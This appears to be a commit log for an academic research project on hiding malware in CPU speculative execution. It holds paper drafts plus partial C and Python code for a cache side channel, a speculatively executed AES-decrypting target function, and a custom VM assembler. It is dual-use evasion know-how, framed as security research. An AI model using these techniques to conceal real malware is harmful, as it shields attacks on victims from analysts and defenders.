### 2018-03-27 paper/paper.tex
outline/template for paper

\documentclass[sigconf, anonymous]{acmart}

\fancyhf{} % Remove fancy page headers 
\fancyhead[C]{Specpiler} % TODO: replace 9999 with your paper number
\fancyfoot[C]{\thepage}

\setcopyright{none} % No copyright notice required for submissions
%\acmConference[Anonymous Submission to ACM CCS 2018]{ACM Conference on Computer and Communications Security}{Due 08 May 2018}{Toronto, Canada}
\acmYear{2017}

\settopmatter{printacmref=false, printccs=true, printfolios=true} % We want page numbers on submissions

%%\ccsPaper{9999} % TODO: replace with your paper number once obtained

\newcommand{\speculake}{SpecPiler}

\begin{document}
\title{\speculake: Hiding Malware in Speculative Execution} % TODO: replace with your title

\begin{abstract}
Recently, the Spectre and Meltdown attacks have revealed serious vulnerabilities in modern CPU
designs, allowing an attacker to exfiltrate data from sensitive programs. These
vulnerabilities take advantage of speculative execution to coerce a processor to
perform computation that would otherwise not occur, leaking the resulting
information via side channels to an attacker.

In this paper, we extend these ideas in a different direction, and leverage speculative
execution in order to \emph{hide malware} from both static and dynamic analysis. Using this
technique, large portions of a malware's computation can be shielded from view,
such that even a debugger following an instruction-level trace of the
program cannot tell how its results were computed.

We introduce \emph{\speculake}, which compiles arbitrary malicious code into a
seemingly-benign payload binary. When a separate trigger program performs a specific
pattern of indirect jumps, it (mis)trains the CPU's branch predictor. Subsequent
executions of the payload binary with similar jumps leads the CPU to mispredict its
branches and speculatively execute the malware's payload, which communicates
results back to the real world via side channels.

We study the extent and types of execution that can be performed in the
``speculative world'', and build tools that enable several computations to be
performed covertly. In particular, within speculative execution we are able to
decrypt memory using AES-NI instructions, and are able to interpret a custom
virtual machine language to perform arbitrary computation.
We also show how the trigger program
can be a pre-existing benign application already running on the system, and
demonstrate this concept with OpenSSL driven remotely by the attacker as our
trigger program.

Finally, we describe defenses, but in all honesty, you're probably not going to like
them.

\end{abstract}

% TODO: replace this section with code generated by the tool at https://dl.acm.org/ccs.cfm

%\begin{CCSXML}
%<ccs2012>
%<concept>
%<concept_id>10002978.10003029.10011703</concept_id>
%<concept_desc>Security and privacy~Usability in security and privacy</concept_desc>
%<concept_significance>500</concept_significance>
%</concept>
%</ccs2012>
%\end{CCSXML}

%\ccsdesc{Security and privacy~Use https://dl.acm.org/ccs.cfm to generate actual concepts section for your paper}
% -- end of section to replace with generated code

\keywords{Malware; TK; TK} % TODO: replace with your keywords

\maketitle

%%%%%%%%%%%%%%
\section{Introduction}

%%%%%%%%%%%%%%
\section{Background}

\subsection{Speculative Execution}
-CPU pipelines -> Branch predictors

\subsection{Branch Prediction}
- direct vs indirect
- BHB, BTB

\subsection{Spectre}
- Basic direct branch
- Indirect branch predictor

%%%%%%%%%%%%%%
\section{Architecture}

Two parts: payload program, and trigger program. Could be combined, but need not
be. Describe high-level concept of parts

\subsection{Limits of Speculative Execution}
- Limits of speculative execution (number of instructions)
- Experiment w/ graph of number of instructions
- Limitation is in the ROB

\subsection{Speculative Primitive}
- Primitive: Perform several hundred arbitrary instructions in the speculative
world, then return fixed-length value to the real world.

%%%%%%%%%%%%%%
\section{Application Payloads}

Given the speculative primitive, what can we do with it?

Finite state machine...

\subsection{Turing Machine}
- Arbitrary computation

\subsection{Unpacking and Decryption}
- AES instructions

\subsection{Virtual Machine}

%%%%%%%%%%%%%%
\section{Trigger Programs}
Easy answer: custom program that mistrains branch predictor

\subsection{Benign Triggers}
Could also be any program on the system, and potentially remote!

%%%%%%%%%%%%%%
\section{Implementation and Evaluation}

\subsection{Turing Machine}

\subsection{AES Decryption}

\subsection{Virtual Machine}

\subsection{OpenSSL Trigger}

%%%%%%%%%%%%%%
\section{Discussion}

\subsection{Defenses}

\subsection{Future Work}

%%%%%%%%%%%%%%
\section{Related Work}

%%%%%%%%%%%%%%
\section{Conclusion}

\bibliographystyle{ACM-Reference-Format}
\bibliography{paper}

\end{document}

### 2018-03-27 paper/paper.tex
some background

@@
 \section{Background}
+Modern CPU designs employ a wide range of tricks in order to maximize
+performance. In this section, we provide preliminary background as they are
+relevant to our system, as well as a brief summary of the Spectre vulnerability.
+
+\subsection{Out-of-Order Execution}
+Many CPUs attempt to keep the pipeline full by executing instructions \emph{out of
+order}, with the CPU allowing future instructions to be worked on and executed
+while it waits for slower or stalled instructions to complete. To maintain
+correctness and the original (Von Neumann) ordering, instructions are tracked in
+a \emph{reorder buffer} (ROB), which keeps the order of instructions as they are
+worked on out of order. Instructions are \emph{retired} from the ROB when
+they are completed and there are no previous instructions that have yet to
+retire. Upon retiring, an instruction's results are committed to the architectural
+state of the CPU. Thus, the ROB ensures that the program (or debugger) view
+of the CPU state always updates in program execution order, despite out of order
+execution.
 
 \subsection{Speculative Execution}
--CPU pipelines -> Branch predictors
+
+CPUs also attempt to keep their pipeline full by predicting the path of
+execution. For example, a program may contain a branch that depends on a result
+from a prior slow instruction. Rather than wait for the result, the CPU can
+\emph{speculatively execute} instructions down one of the paths of a branch,
+storing the results of the speculative instructions in the ROB.
+If the guess of the branch target turns out to be correct, the CPU can quickly
+retire all the instructions it has speculatively executed while waiting. If the
+guess is incorrect, the CPU must discard the
+(incorrectly) speculated instructions from the ROB, and continue executing from the
+correct branch target.
 
 \subsection{Branch Prediction}
-- direct vs indirect
-- BHB, BTB
+When a CPU mispredicts a branch, the speculative execution results are
+discarded, costing the CPU several cycles as the pipeline is flushed. To
+minimize this, CPUs employ \emph{branch predictors} that attempt to guess the
+path of execution. These predictors can maintain a short history of previous
+branch targets for a particular branch (e.g. whether a certain branch is
+frequently taken or not taken, or if it exhibits a particular pattern), and use
+this to inform the CPU's guess for speculative execution.
+
+There are two kinds of branches a CPU must be able to predict: \emph{direct} and
+\emph{indirect}. A \emph{direct} branch may either jump to a provided address or
+continue executing straight through depending on the state of the CPU (e.g. condition
+registers). While there are only two potential statically-known targets for a direct
+branch, the CPU may not know if the branch is taken or not until preceding
+instructions retire. An \emph{indirect} branch is always taken, but its address
+is determined by the value of a register or memory address. Direct branches are
+typically used for control flow such as \texttt{if} or
+\texttt{for}/\texttt{while} statements, while indirect branches are used for
+function pointers, class methods, or case statements.
+
+%- BHB, BTB
 

### 2018-04-11 decrypt/spasm_vm.c
Decrypt and return one spasm instr at a time

@@ -1,0 +1,187 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <signal.h>
+#include <x86intrin.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/mman.h>
+#include "../common.h"
+#include "../spasm/spasm.h"
+
+// Defines the bandwidth we can communicate
+// from speculative -> von neuman
+// e.g. 256 would be 1 byte of info
+// Tradeoff here is larger bandwidth means we have
+// to check more places in probe_buf (and flush them)
+#define NUM_PROBES 256
+#define DECRYPT_LEN 256
+
+// These define the stride length we take between probes
+// This thwarts a clever CPU's stride prediction
+// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
+// Generally, this results in not seeing ANY winning probes
+// in which case, we change cur_probe_space and retry
+#define MAX_PROBE_SPACE (1000003)
+double avgpct = 0;
+uint64_t cur_probe_space = 4177;
+
+
+// The (heap-allocated) probe buffer
+// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
+// in the cache to communicate the value i from speculative -> von neuman
+uint8_t *probe_buf;
+
+
+// This is a simple counter, accessed by the speculative function (target_fn)
+// so it can compute on it.
+uint16_t signal_idx = 0;
+uint64_t instr = 0;
+
+
+// Stats
+uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
+uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
+uint64_t tot_time = 0;      // Number cycles total
+
+unsigned int junk=0;    // For rdtscp
+
+
+// The state that SPASM can use as its virtual registers and stack 
+// For this test text is empty and we use Enc(text) in decrypt.S - ctext
+// See the README
+State state;
+uint_reg *R;
+
+
+void *map;
+#define TARGET_FN_ADDR 0x414100401000
+
+// We define this function in assembly (target_fn.S)
+// It is never called directly (essentially dead code)
+// However, indirect.c trains the processor to think the indirect
[…]

### 2018-04-11 spasm/process.c

@@ -15,8 +15,6 @@ uint_reg *R;
 void run(int num_instr) {
     uint_reg rip = *(R+SRIP_OFFSET);
 
-    Instruction *instr;
-
     while (true) {
         rip = *(R+SRIP_OFFSET);
         // printf("RIP - %X, I - 0x%02X - ", rip, state.instr[ rip ]);

### 2018-04-11 spasm_vm/trigger.c
quick fix

@@ -6,7 +6,7 @@
 #include <unistd.h>
 #include <sys/mman.h>
 #include <string.h>
-#include "common.h"
+#include "../common.h"
 
 /*
  * This is the target of the indirect call

### 2018-04-11 paper/paper.tex
minor paper edits

@@
 
-\newcommand{\speculake}{SpecPiler}
+\newcommand{\speculake}{Exspectre}
 
@@
 pattern of indirect jumps, it (mis)trains the CPU's branch predictor. Subsequent
-executions of the payload binary with similar jumps leads the CPU to mispredict its
+executions of the payload binary with similar jumps causes the CPU to mispredict its
 branches and speculatively execute the malware's payload, which communicates
@@
 minimize this, CPUs employ \emph{branch predictors} that attempt to guess the
-path of execution. These predictors can maintain a short history of previous
+path of execution. Branch predictors maintain a short history of previous
 branch targets for a particular branch (e.g. whether a certain branch is
-frequently taken or not taken, or if it exhibits a particular pattern), and use
+frequently taken or not taken), and use
 this to inform the CPU's guess for speculative execution.
 
-There are two kinds of branches a CPU must be able to predict: \emph{direct} and
+There are two kinds of branches a CPU handles: \emph{direct} and
 \emph{indirect}. A \emph{direct} branch may either jump to a provided address or
@@
 \subsection{Spectre}
+In early 2018, researchers revealed the Spectre vulnerability, which allows an
+attacker to leak information from a victim program.
+
+Spectre uses speculative execution...
 - Basic direct branch
@@
 \section{Architecture}
+
+\speculake malware is comprised of two independent programs: a payload program, and a
+trigger program. Both are installed on the victim's computer (e.g. via trojan, remote
+exploit, or phishing), a
 

### 2018-04-16 paper/paper.tex
intro draft

@@
 \fancyhf{} % Remove fancy page headers 
-\fancyhead[C]{Specpiler} % TODO: replace 9999 with your paper number
+\fancyhead[C]{Paper \#XXX} % TODO: replace 9999 with your paper number
 \fancyfoot[C]{\thepage}
@@
 \section{Introduction}
+
+Modern CPU designs use speculative execution to maintain high instruction
+throughput, with the goal of improving performance. In speculative execution,
+CPUs execute likely future instructions while they wait for other slower
+results to complete. When the CPU's guess of future instructions is correct, the
+benefit is faster execution performance. When its guess is wrong, the CPU
+simply discards the speculated results and continues executing along the true path.
+
+Previously, it was assumed that speculative execution results
+remain invisible if discarded, as careful CPU design maintains strict separation
+between speculative results and updates to architectual state.
+However, recent research has revealed side channels that violate this
+separation, and researchers have demonstrated ways to exfiltrate results from speculative
+computation. Most notably, the Spectre vulnerability allows attackers to leak
+information from purposefully mis-speculated branches in a victim
+process~\cite{spectre}. The Meltdown vulnerability uses speculative results of an
+unauthorized memory read to sidestep page faults and leak protected memory from
+the kernel~\cite{meltdown}. Both of these vulnerabilities focus on extracting
+secret data from a process or operating system.
+
+\medskip
+
+In this paper, we explore another attack enabled by speculative execution:
+\speculake, which \emph{hides computation} within
+the ``speculative world''. Taking advantage of the CPU's speculation to secretly
+perform computation,
+we can produce binaries that thwart existing reverse engineering
+techniques. Because the speculative parts of a program never ``truly'' execute,
+we can hide program functionality in the unreachable dead code in a program.
+Even a full instruction trace, captured by a hardware debugger or software
+emulator, will be unable to capture the logic performed speculatively.
+This technique could lead to sophisticated malware that hides its behavior
+from both static and dynamic analysis.
+
+Existing malware use several techniques to evade detection and
+make it difficult for analysts to determine payload behavior of
+reported malware. For example, binary \emph{packers} encode an executable payload as
+data that must be ``unpacked'' at runtime, making it difficult to tell
+statically what a program will do~\cite{malware-packers}. Malware may also use
+\emph{triggers} that only run the payload when certain conditions are present, preventing
+it from executing when it is inside an analysis sandbox or debugger.
+
+However, with some effort, these existing techniques can be defeated. Analysts can use
+dynamic execution to unpack malware and reveal its
+behavior~\cite{defeating-packers}, and can use symbolic execution or code
+coverage fuzzers to determine the inputs or triggers that will reveal malicious
+behavior~\cite{symbolic-execution,afl,etc}.
+
+\speculake provides a new technique to malware authors, allowing them to hide
+program functionality in code that does not execute at runtime.
+
+At a high level, \speculake consists of two parts: a payload program, and a
+trigger program. When run by itself, the payload program executes a pattern of
+indirect jumps and measures a cache side channel. While the trigger program is
+not running, the payload program is effectively inactive (and may optionally do some
+decoy operation). When the trigger program runs, it executes a similar pattern of
+indirect jumps (with similar source and destination addresses as the payload
+program), effectively training the CPU's branch predictor to the jump pattern
+specified by the trigger program.
+
+Importantly, the trigger program and payload
+program's indirect jump patterns diverge on the destination of their final jumps.
+However, because the trigger program has trained the CPU's branch predictor, the
+CPU speculates that the payload program will continue following the pattern of
+the trigger program, causing it to speculatively execute a
+\emph{target function} in the payload program. We emphasize that this target
+function is in a region that is neither read nor executed by the payload
+program, and after the CPU discovers the mis-speculation in the payload program,
+it will discard the results from the target function and continue executing from
+the correct destination. However, the payload program has a limited speculative
+window where it can perform computation in the target function, and can
+communicate results back to the ``real world'' payload program via a cache side
+channel.
+
+While it's possible for the trigger and payload programs to be bundled in a
+single program, an analyst aware of \speculake could easily find the target
+function in the payload program based on the jump pattern in the trigger program.
+However, if the trigger and payload are kept separate, the analyst has a much
+harder job and must identify both.
+Moreover, it is possible that the trigger program be a
+seemingly-unrelated benign program already on the victim's computer. We
+investigate using the OpenSSL library as a benign trigger
+program in Section~\ref{sec:tk}. If the trigger program is another benign
+program on the system, the analyst has the difficult task of identifying which
+program, library, or even operating system component is responsible for training
+the CPU's branch predictor, and finding the specific set of jumps that occur at
+runtime. To make matters worse, the payload program can include dummy jump
+patterns that are effectively dead ends for the analyst, as they do not
+ultimately call the target function speculatively.
+
+Simulating or modelling the speculative execution path is a difficult task for a
+program analyst hoping to reverse engineer an \speculake binary. First, the
+analyst must reverse engineer and accurately model the closed-source proprietary
+components of the target CPU, including the branch predictor, cache hierarchy,
+out-of-order execution, and hyperthreading. In contrast, the \speculake
+author only has to use a partial model of these components and produce binaries
+that take advantage of them, while the analyst's model must be complete to
+capture all potential \speculake uses. Second, the analyst must run all
+potential trigger programs through the simulator, including benign programs with
+realistic inputs. Both of these contribute to a time-consuming and expensive
+endeavor for would-be analysts.
+
+% Results summary
+In order to study the potential of \speculake, we implement several example
+payload programs and evaluate their performance.
+We find that the speculative window is limited mainly by the reorder buffer
+size, and confirm that we are able to execute between 100 and 200 instructions
+speculatively on modern Intel CPUs. While brief, we are able to perform
+execution in short steps, communicating intermediate results back to the ``real
+world'' part of the payload program. Using this technique,
+we demonstrate implementing a universal Turing machine
+(demonstrating arbitrary computation), a custom instruction set architecture
+that fits within the constraints of speculative execution, and show
+the ability to perform AES decryption
+of a payload via AES encrypt/decrypt instructions.
+
+Using these building blocks, we demonstrate the practicality of hiding arbitrary
+computation by decrypting an AES-encrypted ARM binary in the speculative world
+one instruction at a time, returning the decrypted next instruction to the real
+world part of the payload program, which updates a virtual machine. We show that
+we are able to decrypt and process approximately 25 instructions per second.
+
+% contributions?
+% - explore the limits of speculative execution
+% - propose novel concept of hiding computation in speculative execution
+% - implement example applications using this concept, including decrypting
+%   data speculatively
+% - demonstrate using benign program (openssl) as trigger
+% - identify defenses and discuss ways to counter them
+
+% TODO: we don't talk at all about how an analyst might try to enumerate
+% the potential entry points to the speculative world, and how that can be
+% made difficult
 

### 2018-04-18 measure.c
can't quite do full AES with key schedule in speculative world

@@ -143,7 +143,7 @@ void measure() {
             }
 
         } else {
-            // printf("--[%lu]: %lu, %lu avg cycles ps %ld\n", max_i, max_res, avg, cur_probe_space);
+            printf("--[%lu]: %lu, %lu avg cycles ps %ld\n", max_i, max_res, avg, cur_probe_space);
             misses++;
             cur_probe_space += 63;
             cur_probe_space %= MAX_PROBE_SPACE;

### 2018-04-18 target_fn.c

@@ -21,10 +21,11 @@ void signal(uint64_t state)
 void target_fn(void) __attribute__((section(".targetfn")));
 void target_fn(void)
 {
+    /*
     register uint8_t *pb = (uint8_t*)*((uint8_t**)0x480000);  // probe_buf
     register uint64_t cps = *((uint64_t*)0x480010);  // cur_probe_space
     asm volatile ("mov (%%rcx), %%rax" :: "c"(&pb[13*cps]) : "rax");
-
+    */
 
     //while(1);
     //*(uint8_t*)(0);
@@ -42,8 +43,8 @@ void target_fn(void)
 
 
     //signal(11);
-    //__uint128_t register pt = aes_ctr(signal_idx / 16);
-    //signal(pt >> ((signal_idx % 16)*8) & 0xff);
+    __uint128_t register pt = aes_ctr(signal_idx / 16);
+    signal(pt >> ((signal_idx % 16)*8) & 0xff);
 
 }
 

### 2018-04-19 paper/paper.tex
add brief description of spectre

@@
 \documentclass[sigconf, anonymous]{acmart}
+
+\usepackage{listings}
+\input{figures}
 
@@
 \subsection{Spectre}
+
 In early 2018, researchers revealed the Spectre vulnerability, which allows an
-attacker to leak information from a victim program.
+attacker to leak information from a victim program~\cite{specte}. Spectre uses
+the fact that speculative execution can influence system state via side
+channel. In Spectre, an attacker mistrains the branch predictor of a CPU running
+a victim program by providing inputs to it. Once mistrained, the attacker then
+sends a new input that will cause a different in-order execution path. However,
+because the CPU's branch predictor has been mistrained, it will still
+speculatively execute the previous path.
 
-Spectre uses speculative execution...
-- Basic direct branch
-- Indirect branch predictor
+Consider the following code snippet from the Spectre
+paper~\cite{spectre}:
+
+\begin{lstlisting}
+    if (x < array1_size)
+        y = array2[array1[x] * 256];
+\end{lstlisting}
+
+The \texttt{if} statement correctly protects an out-of-bounds reads from \texttt{array1}.
+But if the branch predictor makes an incorrect guess on the branch's direction
+and speculatively executes inside the \texttt{if} statement, it may
+cause a read beyond the boundary of \texttt{array1}. The result of this will
+then (speculatively) be multiplied by 256 and used as an index into
+\texttt{array2}. Although the CPU will not commit
+the speculative update to \texttt{y}, it will still issue a memory read to
+\texttt{array2[array1[x]*256]}, which will be cached. Importantly, even after
+the CPU realizes the branch misprediction, it does not rollback the
+state of the cache, as this does not directly influence program correctness.
+However, the set of cached values is observable to the program via a
+side-channel: by timing reads to \texttt{array2[i]}, the fastest read will
+reveal the speculative value of \texttt{array1[x]*256}, for any value of
+\texttt{x}. An attacker that is able to perform such a side-channel inference on
+the cache can learn the speculative result of an out-of-bounds read from
+\texttt{array1}.
+
+Spectre can also be applied to indirect branches. Branch predictors use the
+history of previous branches to predict the destination of an indirect jump when
+the destination is not yet known. For direct branches, only one of two
+destinations (taken or not taken) are possible to speculatively execute. But for
+indirect branches, a mistrained branch predictor can potentially be coerced into
+speculatively executing from \emph{any} target instruction in the binary.
+
+TODO more on why this is crucial...
 

### 2018-04-19 spasm/assembler/asm_spasm.py
Re-organization of spasm dir, incremental update to spasm assembler (not done yet), example .spa programs written for assembler in examples

@@ -51,11 +51,9 @@ class Assembler():
                 labels[match.group().strip(":")]["line_num"] = i+1
                 labels[match.group().strip(":")]["index"] = 0
 
-
-
-            
         return labels
 
+            
 
     def insert_instrs(self, index, new_instrs):
         try: 

### 2018-04-19 spasm/assembler/instr_spasm.py

@@ -1,0 +1,169 @@
+#!/usr/bin/env python3
+
+
+class Instr:
+
+    def __init__(self):
+        
+        self.opstr = ""
+        self.opcode = 0
+
+        self.use_immed = False
+        self.immed = 0
+
+        self.use_label = False
+        self.label_index = 0 
+        self.label_str = ""
+
+
+    def __init__(self, instr):
+        self.opstr = ""
+        self.opcode = 0
+
+        self.use_immed = False
+        self.immed = 0
+
+        self.use_label = False
+        self.label_index = 0 
+        self.label_str = ""
+        
+        # Now parse the new instruction
+        self.parse_opstr(instr)
+
+
+    def parse_opstr(self, instr):
+        op = instr[0].upper()
+
+        if op == "UVAL":
+            self.opstr = op
+            self.use_immed = True
+            if len(instr) <= 1:
+                raise InstrError("UVAL - immediate not specified", self) 
+            try: 
+                if len(format(int(instr[1], 16), 'x')) > 1: 
+                    raise InstrError("UVAL - immediate too long", self)
+                self.immed = int(instr[1], 16) 
+            except ValueError as e:
+                raise InstrError("UVAL - unable to parse immediate", self)
+
+        elif op == "SYSCALL":
+            self.opstr = op
+            self.opcode = 0x1F
+        elif op == "BASE":
+            self.opstr = op
+            self.opcode = 0x1E
+        elif op == "SHVAL":
+            self.opstr = op
+            self.opcode = 0x1D
+        elif op == "MREG":
+            self.opstr = op
+            self.opcode = 0x1C
+        elif op == "PUSH":
+            self.opstr = op
+            self.opcode = 0x1B
+        elif op == "POP":
+            self.opstr = op
+            self.opcode = 0x1A
+        elif op == "APTR":
+            self.opstr = op
+            self.opcode = 0x19
+        elif op == "DPTR":
+            self.opstr = op
+            self.opcode = 0x18
+        elif op == "SWAP":
+            self.opstr = op
+            self.opcode = 0x17
+        elif op == "JZ":
+            self.opstr = op
+            self.opcode = 0x13
+        elif op == "J":
+            self.opstr = op
+            self.opcode = 0x12
+        elif op == "CALL":
+            self.opstr = op
+            self.opcode = 0x11
+        elif op == "CMP":
+            self.opstr = op
+            self.opcode = 0x10
+        elif op == "ADD":
+            self.opstr = op
[…]

### 2018-04-19 spasm/assembler/parser_spasm.py

@@ -1,0 +1,198 @@
+
+from instr_spasm import *
+
+MACROS = ["EUVAL", "ESET", "EGET", "ECALL", "EPUSH"]
+        # TODO: "CMPJE", "CMPJNE", "CMPJZ", "CMPJNZ", "CMPJL", "CMPJLE", "CMPJG", "CMPJGE"]
+
+REGISTERS = {"SRIP":0, "SRSP":1, "SRAX":4, "SRBX":5, "SRCX":6, "SRDX":7,
+             "SRSI":8, "SRDI":9, "SRBP":10, "SR8":11, "SR9":12}
+MAX_ADDR_LEN = 10
+
+class Parser:
+    
+    def __init__(self, labels):
+        self.labels = labels
+
+
+    def parse(self, line):
+        # Return
+        #    n              Number of instructions to be added 
+        #    instrs         Array of Instr - instructions to be executed in order
+        #    Label(s) (opt) If the instruction has any labels associated with it return here
+
+        label = None
+        instrs = []
+        n = 0
+
+        # Split off any comments 
+        line_sep = line.split("#", 1)[0]
+
+        # If the line is empty ignore it
+        if line_sep.isspace():
+            return (n, instrs, label)
+        
+        # Separate opstring from arguments
+        line_split = line_sep.split()
+    
+        if self.has_label(line_split):
+            label = line_split[0].strip(":")
+            
+            # Only a label on this line return it for assembler to index
+            if len(line_split) == 1:
+                return (n, instrs, label)
+
+            else: 
+                line_split = line_split [1:]
+         
+        if self.is_macro(line_split):
+            # Generate the series of instructions composing the macro    
+            n, instrs = self.expand_macro(line_split)
+
+        else:
+            # generate the one instruction and return it
+            instr = Instr(line_split)
+            instrs.append(instr)
+            n = 1
+
+        # Return the number of instructions added by expand_macro
+        return (n, instrs, label)
+
+
+    def has_label(self, instr):
+        # Purpose 
+        #   if the opstring is a label report it
+        # Return 
+        #   result          True / False whether the line has a label in the first index
+
+        if instr[0].strip(":") in self.labels:
+            return True
+        else: 
+            return False
+
+
+    #===========[ Functions to handle Macros ]=============
+
+    def is_macro(self, instr):
+        # Purpose 
+        #   If the opstring is a MACRO handle it 
+        # Return 
+        #   result          True / False whether the line has a macro 
+
+        if instr[0].upper() in self.MACROS:
[…]

### 2018-04-19 spasm/emulator/process_v.c

@@ -1,0 +1,75 @@
+
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <unistd.h>
+
+#include "spasm.h"
+
+
+State state; 
+
+uint_reg *R;
+
+
+void run(int num_instr) {
+    uint_reg rip = *(R+SRIP_OFFSET);
+
+    while (true) {
+        rip = *(R+SRIP_OFFSET);
+
+        if (( state.instr[ rip ] == 0x1A )  || ( state.instr[ rip ] == 0x1B ) || ( state.instr[ rip ] == 0x11 ) || ( state.instr[ rip ] == 0x13 ))  {
+           printRegs(R, 3);
+        }
+        printReg((R+SRIP_OFFSET),  "SRIP ");
+        printReg((R+VAL_OFFSET),   "VAL  "); 
+        printReg((R+PTR_OFFSET),   "PTR  "); 
+        // printReg((R+SRAX_OFFSET), "SRAX");
+        if ( state.instr[ rip ] == 0x1E ) {
+            printRegs(R, 3);
+        }
+        if ( state.instr[ rip ] == 0x00 ) {
+            break;
+        }
+
+        instr = getInstruction(state.instr[rip]);
+        printInstr(instr);
+        update(R, state.instr[ rip ]);
+        usleep(250000);
+    }
+}
+
+int setup(char *fname){
+    uint8_t instr;
+    FILE *finstr = fopen(fname, "r");
+    int i =0; 
+
+    // Parse spasm instructions out of file into state text section
+    while (fread(&instr, 1, 1, finstr) == 1) {
+        // printInstr(getInstruction((uint8_t)instr));
+        state.instr[i] = (uint8_t)instr;
+        i++;
+    }
+
+    initState(&state);
+    R = state.regs;
+    return i;
+}
+
+
+int main(int argc, char *argv[] ){
+    // printISA();
+    int x =0; 
+    // char *fname = "./examples/hello.sp";
+    char *fname;
+
+    if (argc < 2){
+        printf("No SPASM file specified\n\t> ./process <spasm.sp>\n\n");
+        exit(1);
+    }
+    fname = argv[1];
+    
+    x = setup(fname);
+    run(x);
+}

### 2018-04-19 spasm/instr_spasm.py

@@ -1,77 +1,0 @@
-#!/usr/bin/env python3
-
-
-class Instr:
-
-    def __init__(self):
-        
-        self.opstr = ""
-        self.opcode = 0
-
-        self.use_immed = False
-        self.immed = 0
-
-        self.use_label = False
-        self.label_index = 0 
-        self.label_str = ""
-
-
-    def __init__(self, instr):
-        self.opstr = ""
-        self.opcode = 0
-
-        self.use_immed = False
-        self.immed = 0
-
-        self.use_label = False
-        self.label_index = 0 
-        self.label_str = ""
-        
-        # Now parse the new instruction
-        self.parse_opstr(instr)
-
-
-    def parse_opstr(self, instr):
-        #TODO
-
-        if instr[0] == "J":
-            if instr[1] in labels:
-                print(labels[instr[1]])
-    
-        print("TODO")
-
-    def is_label(self):
-        if self.label:
-            return label
-        else: 
-            return False
-
-    def get_opcode(self):
-        # TODO
-        print("TODO")
-        return format(self.opcode, 'x')
-    
-    def __repr__(self):
-        if self.use_label:
-            return "Instr: {} {}".format(self.opstr, self.label_str)
-        elif self.use_immed:
-            return 'Instr: {} {}'.format(self.opstr, self.immed)
-        else:
-            return 'Instr: {}'.format(self.opstr)
-        
-    def __str__(self):
-        if self.use_label:
-            return 'Instr: {} {}'.format(self.opstr, self.label_str)
-        elif self.use_immed:
-            return 'Instr: {} {}'.format(self.opstr, self.immed)
-        else:
-            return 'Instr: {}'.format(self.opstr)
-        
-
-class InstrError(Exception):
-    def __init__(self, message, instr):
-        super().__init__(message)
-
-    def print_summary(self):
-        print(instr)
-        

### 2018-04-19 paper/paper.tex
quick pass on paper, filled in references

@@
 
-\newcommand{\speculake}{Exspectre}
+\newcommand{\speculake}{Exspectre }
 
@@
 execution in order to \emph{hide malware} from both static and dynamic analysis. Using this
-technique, large portions of a malware's computation can be shielded from view,
+technique, critical portions of a malicious program's computation can be shielded from view,
 such that even a debugger following an instruction-level trace of the
@@
 executions of the payload binary with similar jumps causes the CPU to mispredict its
-branches and speculatively execute the malware's payload, which communicates
+branches and speculatively execute a malicious payload, which communicates
 results back to the real world via side channels.
@@
 them.
+
+We consider this to be a new thrust in attack vector research that harkens to work 
+done on hardware red-pills and weird machines. We demonstrate that unintended 
+functionality of architechture can be used to compose malicious programs with 
+new and different properties. This technique poses novel and unique challenges for 
+malware modeling efforts, as it forces an environment to either
+faithfully reproduce all hardware behaviors, or overcome a much larger burden of 
+reverse engineering.
 
@@
 
-\keywords{Malware; TK; TK} % TODO: replace with your keywords
+\keywords{Malware; Covert Channel; Weird Machines; TK} % TODO: replace with your keywords
 
@@
 CPUs execute likely future instructions while they wait for other slower
-results to complete. When the CPU's guess of future instructions is correct, the
+instructions to complete. When the CPU's guess of future instructions is correct, the
 benefit is faster execution performance. When its guess is wrong, the CPU
@@
 Existing malware use several techniques to evade detection and
-make it difficult for analysts to determine payload behavior of
-reported malware. For example, binary \emph{packers} encode an executable payload as
+make it difficult for analysts to determine payload behavior of reported malware. 
+For example, binary \emph{packers} or \emph{crypters} encode an executable payload as
 data that must be ``unpacked'' at runtime, making it difficult to tell
@@
 dynamic execution to unpack malware and reveal its
-behavior~\cite{defeating-packers}, and can use symbolic execution or code
+behavior~\cite{balzarotti2010efficient}, and can use symbolic execution or code
 coverage fuzzers to determine the inputs or triggers that will reveal malicious
-behavior~\cite{symbolic-execution,afl,etc}.
+behavior~\cite{moser2007exploring,schwartz2010all,wang2017angr,egele2012survey}.
 
@@
 world, then return fixed-length value to the real world.
+- Trade off number of bits for speed when performing cache side channel.
 
@@
 
-\subsection{Virtual Machine}
+\subsection{Virtual Machines}
 

### 2018-04-24 paper/paper.tex
arch section

@@
 
-TODO more on why this is crucial...
+We take advantage of the behavior of indirect branch prediction to hide the
+location of our speculative computation.
+%TODO more on why this is crucial...
 
@@
 trigger program. Both are installed on the victim's computer (e.g. via trojan, remote
-exploit, or phishing), a
+exploit, or phishing), and must run simultaenously on the same physical CPU. We
+note that the constraint of running programs on the same CPU is not a signifcant
+burden: \texttt{taskset} can be used to limit a process to a core, or if not
+available, the attacker can simply run multiple copies of the trigger or payload
+program to coerce the OS scheduler to assign a payload/trigger pair to the same
+core.
 
-Two parts: payload program, and trigger program. Could be combined, but need not
-be. Describe high-level concept of parts
+At a high level, the trigger program performs a series of indirect jumps in a
+loop, training the branch predictor to this pattern. Meanwhile, the
+payload program performs a subset of this jump pattern, then forces the CPU to
+speculate by stalling the resolution of an indirect branch via a slow memory
+read. The CPU will (mistakenly) predict the jump to follow the pattern performed
+by the trigger program, and speculatively execute that destination in the
+payload program.
+
+\subsection{Indirect jumps}
+
+Indirect branch predictors allow the CPU to predict the destination address of a
+branch based solely off its source address and a brief history of previous
+branch sources and destinations. While the inner-working details of modern CPU
+branch predictors are proprietary, it is possible to reverse engineer parts of
+their behavior, which we do in \speculake.
+
+We created a simple trigger program that performs a series of 32 indirect jumps,
+using the \texttt{jmpq *\%rax} instruction. Between each jump, we increment
+\texttt{\%rax} to account for the number of bytes between jumps. For the last
+jump, we load a function pointer into \texttt{\%rax} and do a final indirect
+jump using \texttt{callq \%rax}.
+
+In our payload program, we first perform the same 32 indirect jumps. We ensure
+the source address of these jumps is the same as in the trigger program by
+manually defining their containing function at a fixed address inside a linker
